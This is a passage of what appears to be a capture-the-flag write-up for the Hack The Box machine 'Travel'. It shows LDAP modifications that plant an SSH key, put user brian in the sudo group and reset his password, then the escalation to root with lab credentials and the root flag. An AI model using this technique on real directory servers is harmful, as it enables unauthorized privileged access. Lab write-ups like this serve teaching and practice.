+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4DI4dq2RmPw/RCmKy6ss0SBs9X3qnK3UdM71KFOQzOvdhgD8F6rpUe3G2xxawWov2qeajOdE3bfmrfqH9EMoh1B2FgOoDP+/7LcvA2NhLXHtVPI1lvvmrI6BceLacnRTXxHsZbsJnF6CkHrDSZhhzmK0t8GEKocIabkfoweD+B+cO2/K3+D0Wm3eiNCyQldb/OydSgOxsK9/2Irp/X1WWErgtvzOAXCKYnQRJ154Xr907FEFl3jskE8bHnRJ7qHej3pM1epw6ecAeUpXiayjlSibT1rzTEEInx73NBeTq25Bew7TJ6C681ExlUvDh2jOeprvj1svP79lyaUckrB91g604D7AarJKzMrQlNj9/obBNFOgiOVNmvEtKDC2InKU6XMTSaRu7GeDw1I11cjRHYx8f0G2D/dEpHReupg+cIlvf8K7p5CRLmiXmDBPjPO7WfBBB3E4ZkOFvt+a3pjyVTNNUXT/ZDGtFNYSrmsJkJWL7yt6yKpRszOW63wZOfF0="</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"-"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"replace: gidNumber"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"gidNumber:27"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"-"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"replace: userPassword"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"userPassword: 1stepcloser"</span> <span class="o">&gt;&gt;</span> /dev/shm/brian.ldif
+
+lynik-admin@travel:~<span class="nv">$ </span>ldapmodify <span class="nt">-x</span> <span class="nt">-H</span> ldap://ldap.travel.htb <span class="nt">-w</span> <span class="s2">"Theroadlesstraveled"</span> <span class="nt">-D</span> <span class="s1">'cn=lynik-admin,dc=travel,dc=htb'</span> <span class="nt">-f</span> /dev/shm/brian.ldif
+
+  modifying entry <span class="s2">"uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lynik-admin@travel:~<span class="nv">$ </span>/usr/bin/sss_ssh_authorizedkeys brian
+
+  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4DI4dq2RmPw/RCmKy6ss0SBs9X3qnK3UdM71KFOQzOvdhgD8F6rpUe3G2xxawWov2qeajOdE3bfmrfqH9EMoh1B2FgOoDP+/7LcvA2NhLXHtVPI1lvvmrI6BceLacnRTXxHsZbsJnF6CkHrDSZhhzmK0t8GEKocIabkfoweD+B+cO2/K3+D0Wm3eiNCyQldb/OydSgOxsK9/2Irp/X1WWErgtvzOAXCKYnQRJ154Xr907FEFl3jskE8bHnRJ7qHej3pM1epw6ecAeUpXiayjlSibT1rzTEEInx73NBeTq25Bew7TJ6C681ExlUvDh2jOeprvj1svP79lyaUckrB91g604D7AarJKzMrQlNj9/obBNFOgiOVNmvEtKDC2InKU6XMTSaRu7GeDw1I11cjRHYx8f0G2D/dEpHReupg+cIlvf8K7p5CRLmiXmDBPjPO7WfBBB3E4ZkOFvt+a3pjyVTNNUXT/ZDGtFNYSrmsJkJWL7yt6yKpRszOW63wZOfF0<span class="o">=</span>
+</code></pre></div></div>
+
+<p>After running <strong><code class="highlighter-rouge">/usr/bin/sss_ssh_authorizedkeys</code></strong> for the user, <strong><code class="highlighter-rouge">brian</code></strong>, it is verified that the public key was successfully written for the user.</p>
+
+<h2 id="part-6--privilege-escalation-brian---root">PART 6 : PRIVILEGE ESCALATION (brian -&gt; root)</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> ~/Desktop/travel_brian.id_rsa <span class="nt">-l</span> brian 10.10.10.189
+
+brian@travel:~<span class="nv">$ </span><span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>5002<span class="o">(</span>brian<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,5000<span class="o">(</span>domainusers<span class="o">)</span>
+
+brian@travel:~<span class="nv">$ </span><span class="nb">sudo </span>su - 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>brian: 1stepcloser
+
+root@travel:~# <span class="nb">id
+
+  </span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+  
+root@travel:~# <span class="nb">cat</span> /root/root.txt
+
+  1c4d4d54d3e6c1931e7b3fa5ac28edb9
+</code></pre></div></div>
+
+<p>The added group (<strong><code class="highlighter-rouge">sudo</code></strong>) and the password change to <strong><code class="highlighter-rouge">1stepcloser</code></strong> were successful as well.</p>
+
+<hr />
+
+<h2 id="part-7--references">PART 7 : REFERENCES</h2>
+
+<ul>
+  <li>
+    <p>https://simplepie.org/</p>
+  </li>
+  <li>
+    <p>https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php</p>
+  </li>
+  <li>
+    <p>https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache.php</p>
+  </li>
+  <li>
+    <p>https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php</p>
+  </li>
+  <li>
+    <p>https://riptutorial.com/php/example/4604/–sleep—and—wakeup–</p>
+  </li>
+  <li>
+    <p>https://blog.scalesec.com/just-in-time-ssh-provisioning-7b20d9736a07</p>
+  </li>
+  <li>
+    <p>https://simp.readthedocs.io/en/master/user_guide/User_Management/LDAP.html</p>
+  </li>
+  <li>
+    <p>https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system</p>
+  </li>
+</ul>
+
+</section>
+       </div>
+    </div>
+
+    <script>
+      function openNav() {
+        document.getElementById("sidebar").style.width = "250px";
+        document.getElementById("content").style.marginLeft = "250px";
+      }
+      function closeNav() {
+        document.getElementById("sidebar").removeAttribute("style");
+        document.getElementById("content").removeAttribute("style");
+      } 
+    </script>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
